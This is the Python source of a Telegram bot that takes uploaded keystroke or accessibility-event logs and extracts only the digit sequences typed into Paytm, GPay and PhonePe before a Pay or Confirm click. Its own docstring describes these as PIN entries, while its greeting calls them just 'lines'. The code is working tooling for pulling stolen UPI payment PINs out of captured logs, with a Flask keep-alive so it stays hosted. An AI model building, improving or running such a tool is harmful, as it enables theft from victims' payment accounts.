import os
import re
import tempfile
import logging
import threading
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN env var is required")

# Match any log line whose app column is Paytm / GPay / Google Pay / PhonePe
APP_LINE_RE = re.compile(
    r"^\s*(TEXT|CLICKED)\s*->\s*(?P<app>[^\[\]\-]+?)\s*->\s*\[(?P<val>.*?)\]\s*$",
    re.I,
)
SUBMIT_WORDS = re.compile(r"^(Pay|Check|Confirm|Submit|Done|Verify|OK|Proceed.*|Pay\s*₹.*)$", re.I)
DIGIT_ONLY = re.compile(r"^\d{1,8}$")

TG_MSG_LIMIT = 3900  # keep under Telegram's 4096-char cap


def filter_lines(text: str) -> str:
    """Return only PIN-entry blocks per app.

    A block = a run of TEXT/CLICKED lines whose value is a pure digit,
    where the TEXT buffer reaches >=4 digits (a PIN, not a ₹amount),
    followed by the closing CLICKED submit line (Pay/Check/Confirm).
    Separated by a blank line between blocks.
    """
    blocks = []
    current = []          # candidate block lines
    max_digit_len = 0     # longest digit-value seen in current block
    has_clicked_digit = False  # PIN pads emit CLICKED per keypress; dialers don't

    def close():
        nonlocal current, max_digit_len, has_clicked_digit
        # A real PIN-entry block reaches >=4 digits AND has per-key CLICKED events
        # (this filters plain text/dial pads that only emit TEXT).
        if current and max_digit_len >= 4 and has_clicked_digit:
            blocks.append("\n".join(current))
        current = []
        max_digit_len = 0
        has_clicked_digit = False

    for raw in text.splitlines():
        ln = raw.rstrip()
        if not ln.strip():
            continue  # blank lines don't break a block
        m = APP_LINE_RE.match(ln)
        if not m:
            close()
            continue
        event = m.group(1).upper()
        val = m.group("val").strip()
        if DIGIT_ONLY.match(val):
            current.append(ln)
            max_digit_len = max(max_digit_len, len(val))
            if event == "CLICKED":
                has_clicked_digit = True
        elif SUBMIT_WORDS.match(val) and current:
            current.append(ln)
            close()
        else:
            close()

    close()
    return "\n\n".join(blocks)


def chunk(s: str, n: int = TG_MSG_LIMIT):
    buf = []
    size = 0
    for line in s.split("\n"):
        add = len(line) + 1
        if size + add > n and buf:
            yield "\n".join(buf)
            buf, size = [], 0
        buf.append(line)
        size += add
    if buf:
        yield "\n".join(buf)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Send me a .txt log file. I'll return only the Paytm / GPay / PhonePe lines."
    )


async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc or not doc.file_name.lower().endswith(".txt"):
        await update.message.reply_text("Please send a .txt file.")
        return

    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, doc.file_name)
        tg_file = await doc.get_file()
        await tg_file.download_to_drive(path)
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            text = f.read()

        filtered = filter_lines(text)
        if not filtered:
            await update.message.reply_text("No Paytm / GPay / PhonePe lines found.")
            return

        # If output is big, send as a file; otherwise as chunked text.
        if len(filtered) > 8000:
            out_path = os.path.join(tmp, "filtered_" + doc.file_name)
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(filtered)
            with open(out_path, "rb") as f:
                await update.message.reply_document(document=f, filename=os.path.basename(out_path))
        else:
            for part in chunk(filtered):
                await update.message.reply_text(f"```\n{part}\n```", parse_mode="Markdown")


web = Flask(__name__)


@web.get("/")
def health():
    return "Filterbot is alive", 200


def run_web():
    port = int(os.environ.get("PORT", "10000"))
    web.run(host="0.0.0.0", port=port)


def main():
    # Keep-alive HTTP server for Render + UptimeRobot pings
    threading.Thread(target=run_web, daemon=True).start()

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_doc))
    logging.info("Bot started (polling).")
    app.run_polling()


if __name__ == "__main__":
    main()
